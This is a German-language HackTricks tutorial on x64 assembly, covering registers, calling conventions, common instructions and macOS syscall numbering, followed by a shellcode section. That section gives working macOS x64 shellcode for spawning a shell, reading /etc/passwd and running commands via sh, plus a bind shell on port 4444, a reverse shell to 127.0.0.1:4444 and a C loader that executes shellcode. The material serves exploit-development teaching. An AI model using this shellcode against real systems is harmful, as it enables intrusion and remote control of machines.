# Einführung in x64

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

## **Einführung in x64**

x64, auch bekannt als x86-64, ist eine 64-Bit-Prozessorarchitektur, die hauptsächlich in Desktop- und Server-Computing verwendet wird. Ursprünglich von der von Intel produzierten x86-Architektur abgeleitet und später von AMD unter dem Namen AMD64 übernommen, ist sie heute die vorherrschende Architektur in Personalcomputern und Servern.

### **Register**

x64 erweitert die x86-Architektur und verfügt über **16 allgemeine Register**, die als `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi` und `r8` bis `r15` bezeichnet sind. Jedes dieser Register kann einen **64-Bit** (8-Byte) Wert speichern. Diese Register verfügen auch über 32-Bit-, 16-Bit- und 8-Bit-Teilregister für Kompatibilität und spezifische Aufgaben.

1. **`rax`** - Traditionell für **Rückgabewerte** von Funktionen verwendet.
2. **`rbx`** - Oft als **Basisregister** für Speicheroperationen verwendet.
3. **`rcx`** - Häufig für **Schleifenzähler** verwendet.
4. **`rdx`** - Wird in verschiedenen Rollen einschließlich erweiterter arithmetischer Operationen verwendet.
5. **`rbp`** - **Basiszeiger** für den Stapelrahmen.
6. **`rsp`** - **Stapelpointer**, der die Spitze des Stapels verfolgt.
7. **`rsi`** und **`rdi`** - Für **Quell-** und **Zielindizes** in Zeichenketten-/Speicheroperationen verwendet.
8. **`r8`** bis **`r15`** - Zusätzliche allgemeine Register, die in x64 eingeführt wurden.

### **Aufrufkonvention**

Die x64-Aufrufkonvention variiert zwischen Betriebssystemen. Zum Beispiel:

* **Windows**: Die ersten **vier Parameter** werden in den Registern **`rcx`**, **`rdx`**, **`r8`** und **`r9`** übergeben. Weitere Parameter werden auf den Stapel geschoben. Der Rückgabewert befindet sich in **`rax`**.
* **System V (üblicherweise in UNIX-ähnlichen Systemen verwendet)**: Die ersten **sechs ganzzahligen oder Zeigerparameter** werden in den Registern **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** und **`r9`** übergeben. Der Rückgabewert befindet sich ebenfalls in **`rax`**.

Wenn die Funktion mehr als sechs Eingaben hat, werden die **restlichen auf dem Stapel übergeben**. **RSP**, der Stapelpointer, muss **16 Byte ausgerichtet** sein, was bedeutet, dass die Adresse, auf die er zeigt, vor jedem Aufruf durch 16 teilbar sein muss. Das bedeutet, dass normalerweise sichergestellt werden müsste, dass RSP in unserem Shellcode ordnungsgemäß ausgerichtet ist, bevor wir einen Funktionsaufruf tätigen. In der Praxis funktionieren Systemaufrufe jedoch viele Male, auch wenn diese Anforderung nicht erfüllt ist.

### Aufrufkonvention in Swift

Swift hat seine eigene **Aufrufkonvention**, die unter [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64) gefunden werden kann.

### **Gemeinsame Anweisungen**

x64-Anweisungen verfügen über einen umfangreichen Satz, der die Kompatibilität mit früheren x86-Anweisungen beibehält und neue einführt.

* **`mov`**: **Verschiebt** einen Wert von einem **Register** oder einer **Speicherstelle** an eine andere.
* Beispiel: `mov rax, rbx` — Verschiebt den Wert von `rbx` nach `rax`.
* **`push`** und **`pop`**: Werte auf/ vom **Stapel** schieben oder poppen.
* Beispiel: `push rax` — Schiebt den Wert in `rax` auf den Stapel.
* Beispiel: `pop rax` — Popt den obersten Wert vom Stapel in `rax`.
* **`add`** und **`sub`**: **Additions-** und **Subtraktionsoperationen**.
* Beispiel: `add rax, rcx` — Addiert die Werte in `rax` und `rcx` und speichert das Ergebnis in `rax`.
* **`mul`** und **`div`**: **Multiplikations-** und **Divisionsoperationen**. Hinweis: Diese haben spezifische Verhaltensweisen in Bezug auf die Operandennutzung.
* **`call`** und **`ret`**: Zum **Aufrufen** und **Zurückkehren von Funktionen** verwendet.
* **`int`**: Wird verwendet, um einen Software-**Interrupt** auszulösen. Z.B. wurde `int 0x80` für Systemaufrufe in 32-Bit-x86-Linux verwendet.
* **`cmp`**: **Vergleicht** zwei Werte und setzt die Flags der CPU basierend auf dem Ergebnis.
* Beispiel: `cmp rax, rdx` — Vergleicht `rax` mit `rdx`.
* **`je`, `jne`, `jl`, `jge`, ...**: **Bedingte Sprung**-Anweisungen, die die Steuerung basierend auf den Ergebnissen eines vorherigen `cmp` oder Tests ändern.
* Beispiel: Nach einer `cmp rax, rdx`-Anweisung, `je label` — Springt zu `label`, wenn `rax` gleich `rdx` ist.
* **`syscall`**: Wird für **Systemaufrufe** in einigen x64-Systemen (wie modernem Unix) verwendet.
* **`sysenter`**: Eine optimierte **Systemaufruf**-Anweisung auf einigen Plattformen.

### **Funktionsprolog**

1. **Altes Basisregister auf den Stapel schieben**: `push rbp` (speichert das Basisregister des Aufrufers)
2. **Aktuellen Stapelpointer in das Basisregister verschieben**: `mov rbp, rsp` (richtet das neue Basisregister für die aktuelle Funktion ein)
3. **Platz auf dem Stapel für lokale Variablen reservieren**: `sub rsp, <Größe>` (wobei `<Größe>` die Anzahl der benötigten Bytes ist)

### **Funktionsepilog**

1. **Aktuelles Basisregister in den Stapelpointer verschieben**: `mov rsp, rbp` (lokale Variablen freigeben)
2. **Altes Basisregister vom Stapel poppen**: `pop rbp` (stellt das Basisregister des Aufrufers wieder her)
3. **Rückkehr**: `ret` (gibt die Steuerung an den Aufrufer zurück)
## macOS

### syscalls

Es gibt verschiedene Klassen von syscalls, die Sie [**hier finden können**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Dann kannst du jede Syscall-Nummer [**in dieser URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
So um den `open`-Syscall (**5**) aus der **Unix/BSD-Klasse** aufzurufen, müssen Sie `0x2000000` hinzufügen:

Daher wäre die Syscall-Nummer zum Aufrufen von open `0x2000005`

### Shellcodes

Zum Kompilieren:

{% code overflow="wrap" %}
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
{% endcode %}

Um die Bytes zu extrahieren:

{% code overflow="wrap" %}
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
{% endcode %}

<details>

<summary>C-Code zum Testen des Shellcodes</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Entnommen von [**hier**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) und erklärt.

{% tabs %}
{% tab title="mit adr" %}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}

{% tab title="mit Stapel" %}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}
{% endtabs %}

#### Lesen mit cat

Das Ziel ist es, `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` auszuführen, daher ist das zweite Argument (x1) ein Array von Parametern (was im Speicher einem Stapel von Adressen entspricht).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Befehl mit sh aufrufen
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind-Shell

Bind-Shell von [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) auf **Port 4444**.
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Umgekehrte Shell

Umgekehrte Shell von [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Umgekehrte Shell zu **127.0.0.1:4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
